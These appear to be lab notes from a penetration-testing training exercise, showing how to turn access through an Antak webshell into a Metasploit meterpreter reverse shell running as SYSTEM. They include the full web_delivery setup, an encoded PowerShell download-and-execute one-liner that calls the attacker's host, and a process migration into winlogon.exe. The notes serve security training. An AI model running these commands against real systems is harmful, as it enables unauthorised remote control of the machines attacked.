## Gaining a Reverse Shell through the Antak Webshell Web Server
1. 
### Gained access to the Powershell Utility
- We successfully accessed the Antak Webshell Webserver Powershell utility
- ![[Pasted image 20251010203502.png]]
## Creating a Reverse Shell
#### Selecting the Exploit
```bash
sudo msfconsole -q 
search web_delivery 
use 5 

# OR 
use exploit/multi/script/web_delivery 
```
#### Selecting the options and run the exploit
```bash
set payload windows/x64/meterpreter/reverse_tcp 
set LHOST PWNIP 
set SRVHOST PWNIP 
set TARGET 2 
exploit
```
#### Output
```bash
sf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.14.167
LHOST => 10.10.14.167
msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.14.167
SRVHOST => 10.10.14.167
msf6 exploit(multi/script/web_delivery) > set TARGET 2
TARGET => 2
msf6 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.167:4444 
msf6 exploit(multi/script/web_delivery) > [*] Using URL: http://10.10.14.167:8080/V2Bz8Gv
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABmAEUAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAZgBFAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAZgBFAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA2ADcAOgA4ADAAOAAwAC8AVgAyAEIAegA4AEcAdgAvAEkASgBvAGMAVAA0ADEAJwApACkAOwBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADEANgA3ADoAOAAwADgAMAAvAFYAMgBCAHoAOABHAHYAJwApACkAOwA=

```
#### Copy the webshell to the Antak WebServer
- copy the web payload to the Antak Webserver and run it in the powershell commandline
- Then go back to the meterpreter sessions and you will have an active sessions

#### Session Received 
```bash
msf6 exploit(multi/script/web_delivery) > sessions

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WEB-WIN01  10.10.14.167:4444 -> 10.129.202.242:49
                                                                      748 (10.129.202.242)

msf6 exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > 
```

### Migrate the meterpreter session to a more stable process
```bash
meterpreter > ps

Process List
============
PID   PPID  Name         Arch  Session  User               Path
---   ----  ----         ----  -------  ----               ----
0     0     [System Pro
cess]
4     0     System       x64   0
104   4     Registry     x64   0
312   4     smss.exe     x64   0
368   648   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
L SERVICE          2\svchost.exe
396   388   csrss.exe    x64   0
504   388   wininit.exe  x64   0
512   496   csrss.exe    x64   1
568   496   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
e                           EM                 2\winlogon.exe
624   648   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3


meterpreter > getpid
Current pid: 2868
meterpreter > migrate 568
[*] Migrating from 2868 to 568...
[*] Migration completed successfully.
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

